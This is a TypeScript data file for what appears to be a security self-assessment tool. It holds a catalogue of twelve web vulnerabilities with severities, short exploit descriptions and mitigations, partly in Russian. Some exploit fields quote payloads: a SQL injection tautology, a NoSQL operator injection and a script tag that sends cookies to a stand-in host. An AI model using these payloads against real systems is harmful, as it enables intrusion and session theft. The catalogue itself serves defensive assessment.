export type Severity = 'critical' | 'high' | 'medium' | 'low'
export type Threat = {
  id: string
  title: string
  severity: Severity
  vector: string
  description: string
  exploit: string
  mitigation: string
  category: string
}
export type Question = {
  id: string
  step: number
  title: string
  question: string
  hint?: string
  options: { label: string; value: string; score: number; threats: string[] }[]
}
export const THREAT_DB: Record<string, Threat> = {
  sqli: { id:'sqli', title:'SQL Injection', severity:'critical', vector:'Injection', description:'Конкатенация строк в SQL', exploit:'\' OR 1=1 -- дамп БД через UNION', mitigation:'Prepared statements / ORM, least privilege', category:'Injection' },
  xss: { id:'xss', title:'Cross-Site Scripting (XSS)', severity:'high', vector:'Client-Side', description:'Отсутствие экранирования', exploit:'<script>fetch(evil+cookie)</script>', mitigation:'CSP, экранирование, HttpOnly, DOMPurify', category:'Client' },
  weak_hash: { id:'weak_hash', title:'Слабое хеширование паролей', severity:'critical', vector:'Crypto Fail', description:'MD5 / SHA1 / plaintext', exploit:'GPU-брутфорс 8M/сек, радужные таблицы', mitigation:'Argon2id / bcrypt cost12+, соль+pepper', category:'Auth' },
  auth_bypass: { id:'auth_bypass', title:'Слабый контроль доступа', severity:'high', vector:'Broken Access', description:'Нет MFA, слабая сессия', exploit:'Brute-force, JWT none-alg', mitigation:'MFA, короткое TTL JWT, RBAC', category:'Auth' },
  open_ports: { id:'open_ports', title:'Открытые порты / сервисы', severity:'high', vector:'Exposure', description:'Открыты 22/3306/6379', exploit:'Nmap → Redis RCE, SSH brute', mitigation:'Security Groups, VPN/Bastion, fail2ban', category:'Network' },
  no_waf: { id:'no_waf', title:'Отсутствие WAF / Rate limit', severity:'medium', vector:'DoS / Bot', description:'Нет защиты периметра', exploit:'L7 DDoS, credential stuffing', mitigation:'Cloudflare / AWS WAF, rate-limit', category:'Network' },
  no_https: { id:'no_https', title:'Отсутствие TLS', severity:'critical', vector:'MITM', description:'HTTP-only', exploit:'Перехват cookies в публичном Wi-Fi', mitigation:'HSTS, TLS 1.3, certbot', category:'Crypto' },
  weak_tls: { id:'weak_tls', title:'Слабая конфигурация TLS', severity:'medium', vector:'Crypto', description:'TLS 1.0/1.1, self-signed', exploit:'BEAST, POODLE', mitigation:'Только TLS 1.2+, строгий cipher suite', category:'Crypto' },
  no_logging: { id:'no_logging', title:'Слепое пятно мониторинга', severity:'medium', vector:'Detect', description:'Нет логов / SIEM', exploit:'Dwell time 200+ дней без следов', mitigation:'ELK, IDS/IPS, алёрты', category:'Ops' },
  supply_chain: { id:'supply_chain', title:'Уязвимости зависимостей', severity:'high', vector:'Supply Chain', description:'Устаревшие пакеты', exploit:'RCE через Lodash/Log4Shell', mitigation:'Snyk/Dependabot, SBOM, CI audit', category:'Ops' },
  nosql_inj: { id:'nosql_inj', title:'NoSQL Injection', severity:'high', vector:'Injection', description:'Невалидный JSON в Mongo', exploit:'{ "$gt": "" } обход auth', mitigation:'Валидация Zod/Joi, параметризация', category:'Injection' },
  idor: { id:'idor', title:'IDOR / BOLA', severity:'high', vector:'Access', description:'Прямые ID без ACL', exploit:'/api/user/1337 перебором', mitigation:'ACL на каждый объект, UUID', category:'Access' },
}
